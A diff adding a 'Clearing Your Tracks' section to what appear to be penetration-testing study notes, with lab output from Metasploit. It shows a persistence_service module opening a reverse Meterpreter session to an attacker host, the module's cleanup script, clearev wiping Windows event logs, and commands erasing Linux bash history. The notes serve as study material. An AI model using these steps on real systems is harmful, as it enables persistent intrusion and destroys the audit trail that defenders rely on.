@@ -785,4 +785,78 @@ set payload windows/meterpreter/bind_tcp
 - Need `bind_tcp` because target 1 cannot forward reverse connections back to Kali.
 - `LPORT` here will be the port that target 2 listens on.
 
+### Clearing Your Tracks
+#### Clearing Your Tracks On Windows
+```
+show advanced
+```
+- Options may be relevant.
+
+```
+mkdir C:\Temp
+cd C:\Temp
+```
+- Always use `C:\Temp`.
+
+```
+use exploit/windows/local/persistence_service
+set SESSION <session_id>
+set LPORT 4433
+
+[*] Started reverse TCP handler on 10.10.16.2:4433 
+[*] Running module against ATTACKDEFENSE
+[+] Meterpreter service exe written to C:\Users\ADMINI~1\AppData\Local\Temp\vRMPV.exe
+[*] Creating service oJOjN
+[*] Cleanup Meterpreter RC File: /root/.msf4/logs/persistence/ATTACKDEFENSE_20240104.2203/ATTACKDEFENSE_20240104.2203.rc
+[*] Sending stage (175174 bytes) to 10.0.20.54
+[*] Meterpreter session 2 opened (10.10.16.2:4433 -> 10.0.20.54:49737) at 2024-01-04 15:22:04 +0530
+```
+- Some modules have a cleanup file.
+
+```
+cat /root/.msf4/logs/persistence/ATTACKDEFENSE_20240104.2203/ATTACKDEFENSE_20240104.2203.rc
+
+execute -H -f sc.exe -a "stop oJOjN"
+execute -H -f sc.exe -a "delete oJOjN"
+execute -H -i -f taskkill.exe -a "/f /im vRMPV.exe"
+rm "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\vRMPV.exe"
+```
+
+```
+meterpreter > resource /root/.msf4/logs/persistence/ATTACKDEFENSE_20240104.2203/ATTACKDEFENSE_20240104.2203.rc
+
+[*] Processing /root/.msf4/logs/persistence/ATTACKDEFENSE_20240104.2203/ATTACKDEFENSE_20240104.2203.rc for ERB directives.
+resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20240104.2203/ATTACKDEFENSE_20240104.2203.rc)> execute -H -f sc.exe -a "stop oJOjN"
+Process 3356 created.
+resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20240104.2203/ATTACKDEFENSE_20240104.2203.rc)> execute -H -f sc.exe -a "delete oJOjN"
+Process 2792 created.
+resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20240104.2203/ATTACKDEFENSE_20240104.2203.rc)> execute -H -i -f taskkill.exe -a "/f /im vRMPV.exe"
+Process 1012 created.
+Channel 2 created.
+SUCCESS: The process "vRMPV.exe" with PID 3024 has been terminated.
+SUCCESS: The process "vRMPV.exe" with PID 2824 has been terminated.
+resource (/root/.msf4/logs/persistence/ATTACKDEFENSE_20240104.2203/ATTACKDEFENSE_20240104.2203.rc)> rm "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\vRMPV.exe"
+```
+
+#### Cleaning Event Logs
+```
+meterpreter > clearev
+
+[*] Wiping 159 records from Application...
+[*] Wiping 759 records from System...
+[*] Wiping 2571 records from Security...
+```
+- Avoid using this during an engagement.
+
+#### Clearing Your Tracks On Linux
+```
+cd /tmp
+```
+- Always use `/tmp`.
+
+```
+cat /dev/null > ~/.bash_history
+history -c
+```
+
 ## Social Engineering
